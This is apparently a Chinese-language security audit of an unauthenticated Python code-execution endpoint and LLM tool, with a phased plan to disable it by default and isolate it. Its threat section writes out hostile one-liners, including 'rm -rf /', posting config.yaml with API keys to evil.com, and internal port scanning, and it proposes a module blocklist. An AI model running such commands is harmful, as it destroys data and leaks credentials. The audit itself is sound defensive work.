# code_runner.py 安全治理审计

> 按 `code-governance-workflow` 7 步流程执行
> 触发：开源前安全评审 + 外部安全反馈（"泡菜"分析）

---

## ① 范围索引

| 项 | 位置 | 说明 |
|----|------|------|
| 沙箱实现 | `backend/code_runner.py` (94 行) | 唯一实现 |
| HTTP 端点 | `backend/app.py:1752` `POST /api/code/run` | 直接暴露 |
| Function Calling 工具 | `backend/tools.py:92` `execute_code` schema + `:713` handler | LLM 可自动调用 |
| 系统提示词 | `backend/config.py:36` "用户要求跑代码 → 调用 execute_code" | 鼓励 LLM 使用 |
| 调用方 | `/api/code/run` + `execute_code` 工具，共 2 个入口 | 都无鉴权 |

**调用链**：用户/LLM → `execute_code` 工具 或 `POST /api/code/run` → `code_runner.run()` → `asyncio.create_subprocess_exec(sys.executable, script)`

---

## ② 事实核查（READ ONLY）

### 实际行为（已读源码确认）

| 泡菜指出的问题 | 代码证据 | 确认 |
|----------------|----------|------|
| 权限未降级 | L43-47 `create_subprocess_exec` 无 `user=`/`group=`/`preexec_fn` | ✅ 属实 |
| subprocess 万能钥匙 | wrapper 仅重定向 stdout，未删 `subprocess`/`os` 模块 | ✅ 属实 |
| 资源隔离形同虚设 | 只有 `timeout=30`，无 `resource.setrlimit`，无内存/CPU/磁盘限制 | ✅ 属实 |
| 命名空间与网络未隔离 | 无 `unshare`/`namespace`/网络过滤，`socket`/`requests` 可直接 import | ✅ 属实 |
| 命名误导 | L1 docstring "在隔离的 subprocess 中安全执行" + L15 "安全执行" | ✅ 属实 |

### 现有缓解措施（泡菜未提及）

- 输出截断 5000 字符（L75-77）— 防 stdout 爆炸，非安全隔离
- 脚本执行后删除（L88）— 清理痕迹，非隔离
- 无 `shell=True` — 命令注入风险较低，但用户代码本身就可任意

### 承重代码（不能轻易改）

| 文件 | 承重原因 | 改动风险 |
|------|----------|----------|
| `code_runner.run()` 返回 `{"success", "output"}` | 被 `app.py:1755` 和 `tools.py:716` 依赖 | 改返回结构会破坏两个调用方 |
| wrapper 的 `__STDOUT__`/`__STDERR__` 分隔符 | 被 L60-72 解析逻辑依赖 | 改分隔符要同步改解析 |
| `execute_code` 工具 schema | 已注入 DeepSeek Function Calling | 删除会让 LLM 报工具缺失 |

---

## ③ 承重风险识别

### 高危（开源后立即可被利用）

1. **远程代码执行 (RCE)**：`POST /api/code/run` 无鉴权 → 任何人可执行 `import os; os.system("rm -rf /")`
2. **数据外带**：`import requests; requests.post("evil.com", data=open("config/config.yaml").read())` → 偷 API Key
3. **内网渗透**：`import socket; socket.connect(("192.168.1.x", 22))` → 端口扫描

### 中危

4. **资源耗尽**：`x = "a" * 10**10` → OOM Killer 杀进程；`while True: pass` → 30s 100% CPU
5. **磁盘填满**：`open("data/fill", "w").write("x" * 10**12)` → 服务崩溃

### 幽灵代码

- `code_runner.py` 的 `TEMP` 目录在 `data/code_temp/` — 无清理 cron，长期堆积

---

## ④ 最小安全第一刀（分阶段）

### Phase 1：诚实命名 + 默认关闭（零风险，立即可做）

**目标**：停止误导，让开源用户明确知道这不是真沙箱。

| 改动 | 文件 | 行数 |
|------|------|------|
| docstring 改为 "代码运行器（非隔离，仅限本地单用户）" | `code_runner.py` L1, L15 | 2 |
| 新增 `config.yaml` 字段 `code_execution_enabled: false` | `config.py` + `config.yaml.example` | 3 |
| `/api/code/run` 和 `execute_code` 工具检查开关，关闭时返回拒绝 | `app.py:1752`, `tools.py:713` | 8 |
| 新增 `SECURITY.md` 警告多用户部署必须用 Docker | 项目根 | 40 |

**回滚**：`git checkout` 这 5 个文件。

### Phase 2：进程级硬隔离（低风险，Unix 可用）

**目标**：在不用 Docker 的前提下，把进程级风险降到可接受。

| 改动 | 文件 | 说明 |
|------|------|------|
| `resource.setrlimit` 限制内存 256MB + CPU 10s | `code_runner.py` wrapper | 仅 Unix，Windows 跳过+警告 |
| 模块黑名单静态检查 | `code_runner.py` 新增 `_check_code_safety()` | 拦 `subprocess`/`os.system`/`socket`/`requests`/`urllib`/`ctypes` — 可被绕过但提高门槛 |
| 临时目录改用 `tempfile.mkdtemp()` + 执行后 `shutil.rmtree` | `code_runner.py` | 隔离工作目录 |
| `env=` 清空危险环境变量 | `create_subprocess_exec` | 不继承 API Key 等 |

**回滚**：`git checkout backend/code_runner.py`。

**注意**：泡菜已指出黑名单"极易被绕过"，这是权宜之计，不是终极方案。

### Phase 3：Docker 真隔离（生产必做）

**目标**：真正的系统调用拦截 + 资源配额。

```bash
docker run --rm --memory=256m --cpus=0.5 --read-only \
  --network=none --cap-drop=ALL \
  -v /tmp/script.py:/script.py:ro \
  zenith-sandbox python /script.py
```

| 改动 | 文件 | 说明 |
|------|------|------|
| 新增 `sandbox/Dockerfile` | 新文件 | 基于 `python:3.13-slim`，无网络 |
| `code_runner.py` 检测 Docker 可用性，可用则走容器，否则降级 Phase 2 | `code_runner.py` | 双路径 |
| `SECURITY.md` 更新部署指南 | 项目根 | 多用户必须配 Docker |

**回滚**：删 `sandbox/`，`code_runner.py` 回退到 Phase 2。

---

## ⑤ 灰度实施顺序

```
Phase 1（现在做）→ 验证：tsc+py_compile+启动测试
       ↓
Phase 2（可选，本地单用户可跳过）→ 验证：Unix 上测内存/CPU 限制生效
       ↓
Phase 3（多用户部署前必做）→ 验证：Docker 容器内 import socket 失败
```

每步独立 commit，每步可 `git checkout` 单文件回滚。

---

## ⑥ 验收标准

| 维度 | Phase 1 | Phase 2 | Phase 3 |
|------|---------|---------|---------|
| 命名 | docstring 不含"沙箱"字样 | 同 | 同 |
| 默认 | 新装 `code_execution_enabled=false` | 同 | 同 |
| 鉴权 | 关闭时返回 403 JSON | 同 | 同 |
| 内存 | — | `resource.setrlimit` 生效（Unix） | Docker `--memory` 生效 |
| 网络 | — | 黑名单拦截 `import socket`（可绕过） | Docker `--network=none` 真隔离 |
| 文档 | `SECURITY.md` 列明风险 | 补充 Phase 2 限制 | 补充 Docker 部署指南 |
| 回归 | `/api/code/run` 开关开启时仍可跑 `print(1+1)` | 同 | 同 |

---

## ⑦ 人类决策清单

| 决策点 | 选项 | 建议 |
|--------|------|------|
| 开源仓库默认是否启用代码执行？ | A. 默认关 B. 默认开 | **A**（开源面向未知用户，默认关更安全） |
| 你本地个人使用是否启用？ | A. 开 B. 关 | **A**（你信任自己，保留功能） |
| 是否做 Phase 2 进程级硬隔离？ | A. 做 B. 跳过直接 Phase 3 | 看你是否需要非 Docker 的加固 |
| 是否做 Phase 3 Docker 隔离？ | A. 现在做 B. 文档说明后由部署者自决 | **B**（开源项目不应强制 Docker 依赖） |
| `execute_code` 工具是否从 schema 移除？ | A. 移除 B. 保留但受开关控制 | **B**（保留能力，加门禁） |

---

## 总结

泡菜的分析 100% 正确。当前 `code_runner.py` 是"包装+子进程执行"，不是沙箱。

**最小安全第一刀（Phase 1）** 是开源仓库的当务之急：诚实命名 + 默认关闭 + SECURITY.md。这 3 件事零风险、不破坏现有功能，但能避免开源用户被误导。

Phase 2/3 是渐进加固，按部署场景选做。
